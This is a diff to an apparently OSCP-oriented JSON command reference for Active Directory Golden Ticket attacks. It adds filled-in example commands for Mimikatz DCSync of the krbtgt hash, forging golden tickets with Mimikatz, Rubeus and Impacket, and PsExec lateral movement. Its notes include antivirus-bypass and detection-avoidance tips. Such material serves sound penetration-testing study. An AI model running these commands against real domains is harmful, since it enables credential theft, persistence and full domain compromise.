@@ -96,7 +96,8 @@
         "WINDOWS"
       ],
       "oscp_relevance": "high",
-      "notes": "DCSync is the PREFERRED method for obtaining krbtgt hash because it can be performed remotely without logging into the Domain Controller. This reduces detection risk and operational footprint. The attack leverages legitimate AD replication protocols, making it difficult to distinguish from normal DC-to-DC synchronization traffic. Time estimate: 10-30 seconds for hash extraction. Save the NTLM hash immediately - you'll need it for Golden Ticket creation.\n\nMANUAL ALTERNATIVES:\nWithout Mimikatz, you can use Impacket's secretsdump.py: secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt\n\nOr PowerShell with Invoke-Mimikatz: Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\"'\n\nTIME ESTIMATE: 30 seconds - 1 minute (including verification)"
+      "notes": "DCSync is the PREFERRED method for obtaining krbtgt hash because it can be performed remotely without logging into the Domain Controller. This reduces detection risk and operational footprint. The attack leverages legitimate AD replication protocols, making it difficult to distinguish from normal DC-to-DC synchronization traffic. Time estimate: 10-30 seconds for hash extraction. Save the NTLM hash immediately - you'll need it for Golden Ticket creation.\n\nMANUAL ALTERNATIVES:\nWithout Mimikatz, you can use Impacket's secretsdump.py: secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt\n\nOr PowerShell with Invoke-Mimikatz: Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\"'\n\nTIME ESTIMATE: 30 seconds - 1 minute (including verification)",
+      "filled_example": "mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt"
     },
     {
       "id": "ad-golden-ticket-lsa-dump-krbtgt",
@@ -294,7 +295,8 @@
         "WINDOWS"
       ],
       "oscp_relevance": "high",
-      "notes": "Golden Ticket is one of the most powerful Active Directory persistence techniques. Key advantages: (1) Domain-wide access to all resources, (2) krbtgt password rarely changes (only on domain functional level upgrades), (3) Works from non-domain-joined machines, (4) No administrative privileges needed for ticket creation (only for obtaining krbtgt hash initially). EXAM TIP: Always use hostnames (not IPs) when authenticating with Golden Tickets - Kerberos requires FQDNs. Default ticket lifetime is 10 years - extremely suspicious for detection. Consider customizing with /startoffset, /endin, /renewmax flags for realistic lifetimes. Time estimate: 5-10 seconds for ticket creation and injection.\n\nMANUAL ALTERNATIVES:\nRubeus alternative (C# implementation):\nRubeus.exe golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt\n\nImpacket alternative (Linux):\nticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>\nexport KRB5CCNAME=<USERNAME>.ccache\npsexec.py <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass\n\nPowerShell (Invoke-Mimikatz):\nInvoke-Mimikatz -Command '\"kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt\"'\n\nTIME ESTIMATE: 10-15 seconds (creation + injection)"
+      "notes": "Golden Ticket is one of the most powerful Active Directory persistence techniques. Key advantages: (1) Domain-wide access to all resources, (2) krbtgt password rarely changes (only on domain functional level upgrades), (3) Works from non-domain-joined machines, (4) No administrative privileges needed for ticket creation (only for obtaining krbtgt hash initially). EXAM TIP: Always use hostnames (not IPs) when authenticating with Golden Tickets - Kerberos requires FQDNs. Default ticket lifetime is 10 years - extremely suspicious for detection. Consider customizing with /startoffset, /endin, /renewmax flags for realistic lifetimes. Time estimate: 5-10 seconds for ticket creation and injection.\n\nMANUAL ALTERNATIVES:\nRubeus alternative (C# implementation):\nRubeus.exe golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt\n\nImpacket alternative (Linux):\nticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>\nexport KRB5CCNAME=<USERNAME>.ccache\npsexec.py <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass\n\nPowerShell (Invoke-Mimikatz):\nInvoke-Mimikatz -Command '\"kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt\"'\n\nTIME ESTIMATE: 10-15 seconds (creation + injection)",
+      "filled_example": "mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt"
     },
     {
       "id": "ad-golden-ticket-rubeus-create",
@@ -385,7 +387,8 @@
         "WINDOWS"
       ],
       "oscp_relevance": "medium",
-      "notes": "Rubeus is a modern alternative to Mimikatz with better AV/EDR evasion. Advantages: (1) Pure C#, doesn't interact with LSASS directly, (2) Can use AES256 encryption for stealthier tickets, (3) Compiles to .NET assembly (execute-assembly in Cobalt Strike), (4) Active development and updates. Disadvantages: (1) Requires .NET Framework on target, (2) Less feature-complete than Mimikatz for other attacks. EXAM TIP: If Mimikatz is blocked by AV, try Rubeus. For maximum stealth, use /aes256 if you can obtain the AES krbtgt key. Time estimate: 10-20 seconds.\n\nMANUAL ALTERNATIVES:\nAES256 encryption (stealthier):\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /aes256:<AES_KEY> /ptt\n\nSave to file instead of injecting:\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /outfile:ticket.kirbi\nRubeus.exe ptt /ticket:ticket.kirbi\n\nReflective loading (bypass AV):\n[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))\n[Rubeus.Program]::Main('golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /ptt'.Split())\n\nTIME ESTIMATE: 15-30 seconds (including AV bypass if needed)"
+      "notes": "Rubeus is a modern alternative to Mimikatz with better AV/EDR evasion. Advantages: (1) Pure C#, doesn't interact with LSASS directly, (2) Can use AES256 encryption for stealthier tickets, (3) Compiles to .NET assembly (execute-assembly in Cobalt Strike), (4) Active development and updates. Disadvantages: (1) Requires .NET Framework on target, (2) Less feature-complete than Mimikatz for other attacks. EXAM TIP: If Mimikatz is blocked by AV, try Rubeus. For maximum stealth, use /aes256 if you can obtain the AES krbtgt key. Time estimate: 10-20 seconds.\n\nMANUAL ALTERNATIVES:\nAES256 encryption (stealthier):\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /aes256:<AES_KEY> /ptt\n\nSave to file instead of injecting:\nRubeus.exe golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /outfile:ticket.kirbi\nRubeus.exe ptt /ticket:ticket.kirbi\n\nReflective loading (bypass AV):\n[System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))\n[Rubeus.Program]::Main('golden /user:<USER> /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /ptt'.Split())\n\nTIME ESTIMATE: 15-30 seconds (including AV bypass if needed)",
+      "filled_example": "Rubeus.exe golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /rc4:1693c6cefafffc7af11ef34d1c788f47 /ptt"
     },
     {
       "id": "ad-golden-ticket-verify-klist",
@@ -445,7 +448,7 @@
     {
       "id": "ad-golden-ticket-psexec-use",
       "name": "Use Golden Ticket for Lateral Movement (PsExec)",
-      "category": "lateral-movement",
+      "category": "exploitation",
       "subcategory": "active-directory",
       "command": "PsExec.exe \\\\<TARGET_FQDN> cmd.exe",
       "description": "Leverage Golden Ticket for lateral movement to remote systems using PsExec. The forged TGT provides domain-wide administrative access, allowing command execution on any domain system.",
@@ -507,7 +510,8 @@
         "WINDOWS"
       ],
       "oscp_relevance": "high",
-      "notes": "This is the PAYOFF of the Golden Ticket attack - domain-wide administrative access. The forged TGT grants permissions to ANY system in the domain. You're not limited to PsExec - ANY Kerberos-aware tool will work: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc), SMB file access (dir \\\\DC1\\C$). CRITICAL EXAM TIP: ALWAYS use hostnames/FQDNs with Golden Tickets. Using IP addresses forces NTLM authentication and bypasses your forged Kerberos ticket, causing 'Access Denied'. This is the #1 mistake when using Golden Tickets. Time estimate: 5-10 seconds for PsExec connection establishment.\n\nMANUAL ALTERNATIVES:\nAlternative lateral movement methods with Golden Ticket:\n\n1. WMI:\nwmic /node:<TARGET_FQDN> process call create \"cmd.exe /c <command>\"\n\n2. WinRM (PowerShell):\nEnter-PSSession -ComputerName <TARGET_FQDN>\n\n3. Direct SMB access:\ndir \\\\<TARGET_FQDN>\\C$\ncopy file.txt \\\\<TARGET_FQDN>\\C$\\Temp\\\n\n4. RDP:\nmstsc /v:<TARGET_FQDN>\n\n5. Impacket (Linux):\nexport KRB5CCNAME=ticket.ccache\npsexec.py <DOMAIN>/<USER>@<TARGET_FQDN> -k -no-pass\n\n6. Scheduled task:\nschtasks /create /tn \"Update\" /tr \"cmd.exe /c <command>\" /sc once /st 00:00 /S <TARGET_FQDN>\n\nTIME ESTIMATE: 10-20 seconds (connection + authentication)"
+      "notes": "This is the PAYOFF of the Golden Ticket attack - domain-wide administrative access. The forged TGT grants permissions to ANY system in the domain. You're not limited to PsExec - ANY Kerberos-aware tool will work: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc), SMB file access (dir \\\\DC1\\C$). CRITICAL EXAM TIP: ALWAYS use hostnames/FQDNs with Golden Tickets. Using IP addresses forces NTLM authentication and bypasses your forged Kerberos ticket, causing 'Access Denied'. This is the #1 mistake when using Golden Tickets. Time estimate: 5-10 seconds for PsExec connection establishment.\n\nMANUAL ALTERNATIVES:\nAlternative lateral movement methods with Golden Ticket:\n\n1. WMI:\nwmic /node:<TARGET_FQDN> process call create \"cmd.exe /c <command>\"\n\n2. WinRM (PowerShell):\nEnter-PSSession -ComputerName <TARGET_FQDN>\n\n3. Direct SMB access:\ndir \\\\<TARGET_FQDN>\\C$\ncopy file.txt \\\\<TARGET_FQDN>\\C$\\Temp\\\n\n4. RDP:\nmstsc /v:<TARGET_FQDN>\n\n5. Impacket (Linux):\nexport KRB5CCNAME=ticket.ccache\npsexec.py <DOMAIN>/<USER>@<TARGET_FQDN> -k -no-pass\n\n6. Scheduled task:\nschtasks /create /tn \"Update\" /tr \"cmd.exe /c <command>\" /sc once /st 00:00 /S <TARGET_FQDN>\n\nTIME ESTIMATE: 10-20 seconds (connection + authentication)",
+      "filled_example": "PsExec.exe \\\\DC1 cmd.exe"
     },
     {
       "id": "ad-golden-ticket-cleanup",
@@ -557,22 +561,55 @@
       "command": "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USERNAME>",
       "example": "impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator",
       "description": "Forge a Golden Ticket TGT using Impacket's ticketer tool from Linux",
-      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "GOLDEN_TICKET", "IMPACKET", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "GOLDEN_TICKET",
+        "IMPACKET",
+        "OSCP:HIGH"
+      ],
       "variables": [
-        {"name": "<KRBTGT_HASH>", "description": "NTLM hash of krbtgt account", "example": "aad3b435b51404eeaad3b435b51404ee", "required": true},
-        {"name": "<DOMAIN_SID>", "description": "Domain Security Identifier", "example": "S-1-5-21-1234567890-1234567890-1234567890", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain FQDN", "example": "corp.local", "required": true},
-        {"name": "<USERNAME>", "description": "User to impersonate", "example": "Administrator", "required": true}
+        {
+          "name": "<KRBTGT_HASH>",
+          "description": "NTLM hash of krbtgt account",
+          "example": "aad3b435b51404eeaad3b435b51404ee",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN_SID>",
+          "description": "Domain Security Identifier",
+          "example": "S-1-5-21-1234567890-1234567890-1234567890",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain FQDN",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "User to impersonate",
+          "example": "Administrator",
+          "required": true
+        }
       ],
       "flag_explanations": {
         "-nthash": "NTLM hash of krbtgt account (obtained via DCSync)",
         "-domain-sid": "Domain SID (obtain with lookupsid.py or from DCSync output)",
         "-domain": "Target domain FQDN"
       },
-      "success_indicators": ["Saving ticket in <USERNAME>.ccache", "Ticket saved"],
-      "failure_indicators": ["Invalid hash format", "Error creating ticket"],
+      "success_indicators": [
+        "Saving ticket in <USERNAME>.ccache",
+        "Ticket saved"
+      ],
+      "failure_indicators": [
+        "Invalid hash format",
+        "Error creating ticket"
+      ],
       "notes": "Creates .ccache file. Export: export KRB5CCNAME=Administrator.ccache. Then use with: psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator"
     },
     {
       "id": "kerberos-time-sync",
@@ -582,17 +619,33 @@
       "command": "ntpdate -u <DC_IP>",
       "example": "ntpdate -u 192.168.50.70",
       "description": "Synchronize attacker machine time with DC for Kerberos authentication (required within 5 minute skew)",
-      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "TIME_SYNC", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "TIME_SYNC",
+        "OSCP:HIGH"
+      ],
       "variables": [
-        {"name": "<DC_IP>", "description": "Domain Controller IP address", "example": "192.168.50.70", "required": true}
+        {
+          "name": "<DC_IP>",
+          "description": "Domain Controller IP address",
+          "example": "192.168.50.70",
+          "required": true
+        }
       ],
       "flag_explanations": {
         "-u": "Use unprivileged port for NTP query"
       },
-      "success_indicators": ["offset", "adjust time server"],
-      "failure_indicators": ["no server suitable for synchronization found"],
+      "success_indicators": [
+        "offset",
+        "adjust time server"
+      ],
+      "failure_indicators": [
+        "no server suitable for synchronization found"
+      ],
       "notes": "Kerberos requires <5 minute clock skew. Essential before ticket operations. Alternative: rdate -n <DC_IP> or faketime for non-root.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "ntpdate -u 192.168.50.70"
     },
     {
       "id": "kerberos-rubeus-asktgt",
@@ -602,11 +655,32 @@
       "command": "Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<DOMAIN> /ptt",
       "example": "Rubeus.exe asktgt /user:Administrator /password:Password123! /domain:corp.local /ptt",
       "description": "Request a TGT for specified user and inject into current session",
-      "tags": ["ACTIVE_DIRECTORY", "KERBEROS", "RUBEUS", "TGT", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "RUBEUS",
+        "TGT",
+        "OSCP:HIGH"
+      ],
       "variables": [
-        {"name": "<USER>", "description": "Username to authenticate as", "example": "Administrator", "required": true},
-        {"name": "<PASS>", "description": "User's password", "example": "Password123!", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain FQDN", "example": "corp.local", "required": true}
+        {
+          "name": "<USER>",
+          "description": "Username to authenticate as",
+          "example": "Administrator",
+          "required": true
+        },
+        {
+          "name": "<PASS>",
+          "description": "User's password",
+          "example": "Password123!",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain FQDN",
+          "example": "corp.local",
+          "required": true
+        }
       ],
       "flag_explanations": {
         "asktgt": "Request TGT from KDC",
@@ -615,10 +689,17 @@
         "/domain": "Target domain",
         "/ptt": "Pass-The-Ticket - inject into current session"
       },
-      "success_indicators": ["[+] TGT request successful!", "Ticket successfully imported!"],
-      "failure_indicators": ["KDC_ERR_PREAUTH_FAILED", "Client not found in Kerberos database"],
+      "success_indicators": [
+        "[+] TGT request successful!",
+        "Ticket successfully imported!"
+      ],
+      "failure_indicators": [
+        "KDC_ERR_PREAUTH_FAILED",
+        "Client not found in Kerberos database"
+      ],
       "notes": "Use /rc4:<hash> or /aes256:<hash> instead of /password for pass-the-hash. Verify with: klist",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "Rubeus.exe asktgt /user:Administrator /password:Password123! /domain:corp.local /ptt"
     }
   ]
 }
